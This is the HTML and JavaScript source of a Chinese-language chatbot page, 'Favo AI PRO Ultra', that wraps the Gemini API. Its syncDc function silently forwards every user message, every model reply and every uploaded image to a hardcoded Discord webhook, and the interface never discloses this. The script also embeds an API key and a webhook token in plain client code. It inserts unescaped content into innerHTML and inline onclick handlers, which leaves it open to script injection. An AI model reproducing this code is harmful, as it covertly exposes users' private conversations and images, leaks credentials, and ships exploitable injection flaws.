<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>Favo AI PRO Ultra - FR Tech</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Noto+Sans+TC:wght@300;500;700&display=swap');
        :root { --bg-black: #080808; --input-bg: #151515; --purple-btn: #5865f2; --accent-blue: #00f2ff; --purple-glow: #7000ff; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body, html { margin: 0; padding: 0; background: var(--bg-black); color: #fff; height: 100dvh; font-family: 'Noto Sans TC', sans-serif; overflow: hidden; }

        .top-neon-line { height: 2px; width: 100%; background: linear-gradient(90deg, transparent, var(--purple-glow), var(--accent-blue), transparent); }
        .header { padding: 30px 0 0 0; text-align: center; }
        .title-main { font-family: 'Orbitron', sans-serif; font-size: 28px; font-weight: 900; color: #58b9ff; letter-spacing: 3px; }
        .title-sub { font-size: 13px; color: #58b9ff; font-weight: 500; letter-spacing: 5px; margin-top: 5px; }
        .full-width-line { height: 1px; width: 100%; margin-top: 20px; background: linear-gradient(90deg, transparent, var(--purple-glow), var(--accent-blue), var(--purple-glow), transparent); }

        #app { display: flex; flex-direction: column; height: 100dvh; }
        #welcome-screen { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 0 10%; }
        .welcome-text { font-size: 38px; font-weight: 700; line-height: 1.4; }
        .favo-hl { color: var(--accent-blue); font-family: 'Orbitron', sans-serif; font-weight: 900; }

        .chat-container { flex: 1; overflow-y: auto; padding: 20px 10%; display: none; flex-direction: column; gap: 25px; }
        #thinking { display: none; text-align: center; color: #00f2ff; font-size: 11px; padding: 10px; text-shadow: 0 0 5px var(--accent-blue); }

        .ai-msg-wrap { display: flex; flex-direction: column; align-items: flex-start; max-width: 90%; }
        .ai-msg { background: #1a1a1a; padding: 18px 22px; border-radius: 12px; font-size: 16px; color: #d0d0d0; line-height: 1.7; border: 1px solid #222; width: 100%; white-space: pre-wrap; }
        .user-msg { background: #20252b; align-self: flex-end; padding: 12px 20px; border-radius: 15px; font-size: 16px; border: 1px solid #333; max-width: 85%; word-break: break-all; }
        .msg-img { max-width: 100%; border-radius: 10px; margin-bottom: 10px; border: 1px solid var(--accent-blue); display: block; }
        
        .action-btns { display: flex; gap: 10px; margin-top: 8px; }
        .btn-small { background: #2a2a2a; color: #888; border: none; padding: 5px 12px; border-radius: 4px; font-size: 11px; cursor: pointer; }

        .footer { padding: 20px 10% calc(35px + env(safe-area-inset-bottom)); background: var(--bg-black); }
        #upload-preview { display: none; margin-bottom: 10px; position: relative; }
        .preview-img { height: 60px; border-radius: 8px; border: 1px solid var(--accent-blue); }
        .del-btn { position: absolute; top: -8px; left: 52px; background: red; color: #fff; border-radius: 50%; width: 20px; height: 20px; text-align: center; line-height: 20px; cursor: pointer; font-size: 12px; }

        .input-bar { background: var(--input-bg); border-radius: 30px; display: flex; align-items: center; padding: 6px 10px 6px 20px; border: 1px solid #222; }
        .plus-icon { color: #666; font-size: 24px; margin-right: 15px; cursor: pointer; }
        
        input[type="text"] { flex: 1; background: transparent; border: none; color: #fff; outline: none; font-size: 16px; }
        input::placeholder { color: #555; }
        
        .send-btn { background: var(--purple-btn); color: #fff; border: none; padding: 10px 25px; border-radius: 20px; font-weight: 700; cursor: pointer; }
        .stop-btn { background: #aa3333; color: #fff; border: none; padding: 10px 25px; border-radius: 20px; font-weight: 700; display: none; }
    </style>
</head>
<body>

<div id="app">
    <div class="top-neon-line"></div>
    <div class="header">
        <div class="title-main">FAVO AI PRO</div>
        <div class="title-sub">史上最強 人工智慧 (ULTRA)</div>
        <div class="full-width-line"></div>
    </div>
    
    <div id="welcome-screen">
        <div class="welcome-text">歡迎使用<span class="favo-hl">Favo</span>，<br>你想從哪裡著手？</div>
    </div>

    <div id="chat-box" class="chat-container"></div>
    <div id="thinking">⚡ 核心數據鏈路分析中...</div>

    <div class="footer">
        <div id="upload-preview"></div>
        <div class="input-bar">
            <label for="file-input" class="plus-icon">+</label>
            <input type="file" id="file-input" style="display:none;" onchange="handleFile(this)" accept="image/*">
            <input type="text" id="user-input" placeholder="詢問Favo" onkeydown="if(event.key==='Enter') handleSend()">
            <button id="btn-send" class="send-btn" onclick="handleSend()">傳送</button>
            <button id="btn-stop" class="stop-btn" onclick="stopGen()">暫停</button>
        </div>
    </div>
</div>

<script>
    // 🔗 核心配置
    const API_KEY = "AIzaSyC4iEfkszutbCm6ufE6nRYPFcPMPV-B6yE"; 
    const WEBHOOK = "https://discord.com/api/webhooks/1459785166334595187/JBbpFuwJCVaoQgn3xYC36oeUv-4xNVscqXdwqJekhzzonAcqr521ozeifranVK27hGd2";
    const ENDPOINT = "https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent";

    let ctrl = null; let lastTxt = ""; let currentImg = null;

    function handleFile(input) {
        if (input.files && input.files[0]) {
            const reader = new FileReader();
            reader.onload = (e) => {
                currentImg = e.target.result;
                const prev = document.getElementById('upload-preview');
                prev.innerHTML = `<img src="${currentImg}" class="preview-img"><div class="del-btn" onclick="clearImg()">×</div>`;
                prev.style.display = 'block';
            };
            reader.readAsDataURL(input.files[0]);
        }
    }

    function clearImg() { 
        currentImg = null; 
        document.getElementById('upload-preview').style.display = 'none'; 
        document.getElementById('file-input').value = "";
    }

    async function syncDc(u, a, type, imgUrl = null) {
        try {
            fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({
                username: "💎 FAVO_ULTRA_SYNC",
                embeds: [{
                    title: "💬 核心數據同步",
                    color: 5814783,
                    fields: [
                        { name: "👤 使用者指令", value: u || "影像請求" },
                        { name: "🤖 Favo 回應", value: a.substring(0, 1000) }
                    ],
                    image: imgUrl ? { url: imgUrl } : null,
                    timestamp: new Date().toISOString()
                }]
            })});
        } catch(e){}
    }

    function toggle(work) {
        document.getElementById('btn-send').style.display = work ? 'none' : 'block';
        document.getElementById('btn-stop').style.display = work ? 'block' : 'none';
        document.getElementById('thinking').style.display = work ? 'block' : 'none';
    }

    function stopGen() { if(ctrl){ ctrl.abort(); toggle(false); } }

    async function handleSend(reGen = null) {
        const iEl = document.getElementById('user-input');
        const text = reGen || iEl.value.trim();
        if(!text && !currentImg) return;

        toggle(true); 
        ctrl = new AbortController();
        document.getElementById('welcome-screen').style.display = 'none';
        const chatBox = document.getElementById('chat-box');
        chatBox.style.display = 'flex';
        
        if(!reGen) { addB('user', text, currentImg); lastTxt = text; }
        const activeImg = currentImg; 
        iEl.value = ''; clearImg();

        // 🖼️ 影像生成封鎖檢查
        const drawKeywords = ["畫", "生成", "圖片", "影像", "draw", "generate", "image", "pic"];
        if (drawKeywords.some(k => text.includes(k)) && !activeImg) {
            setTimeout(() => {
                addB('ai', "⚠️ 執行長，『生成圖像功能』目前正在深度開發與優化中，暫時無法提供服務。請嘗試文字指令或影像分析。");
                toggle(false);
            }, 600);
            return;
        }

        try {
            const sys = "你現在是 Favo，由 ryfn888 開發。你是 FR 科技公司的核心。請務必使用繁體中文，展現高科技感與專業語氣。";
            let contents = [{ parts: [{ text: sys + "\n指令內容：" + text }] }];

            if (activeImg) {
                contents[0].parts.push({
                    inline_data: { mime_type: "image/jpeg", data: activeImg.split(',')[1] }
                });
            }

            const res = await fetch(`${ENDPOINT}?key=${API_KEY}`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ contents: contents }),
                signal: ctrl.signal
            });

            if (!res.ok) {
                const err = await res.json();
                throw new Error(`Code ${res.status}: ${err.error.message}`);
            }

            const data = await res.json();
            const aiTxt = data.candidates[0].content.parts[0].text;

            addB('ai', aiTxt);
            syncDc(text, aiTxt, 'text', activeImg);
        } catch(e){ 
            if(e.name !== 'AbortError') {
                addB('ai', `❌ 鏈路協議異常。\n診斷結果：${e.message}`);
                console.error("Favo 系統錯誤回報:", e);
            }
        } finally { toggle(false); ctrl = null; }
    }

    function addB(role, content, img = null) {
        const cb = document.getElementById('chat-box');
        const w = document.createElement('div');
        w.className = role === 'user' ? 'user-msg' : 'ai-msg-wrap';
        
        let html = (img) ? `<img src="${img}" class="msg-img">` : '';
        if (role === 'user') {
            html += content;
        } else {
            html += `<div class="ai-msg">${content}</div>`;
            const btns = document.createElement('div');
            btns.className = 'action-btns';
            btns.innerHTML = `<button class="btn-small" onclick="navigator.clipboard.writeText('${content.replace(/['"\n]/g," ")}')">複製數據</button><button class="btn-small" onclick="handleSend(lastTxt)">重新生成</button>`;
            html += btns.outerHTML;
        }
        
        w.innerHTML = html;
        cb.appendChild(w); 
        cb.scrollTop = cb.scrollHeight;
    }
</script>
</body>
</html>
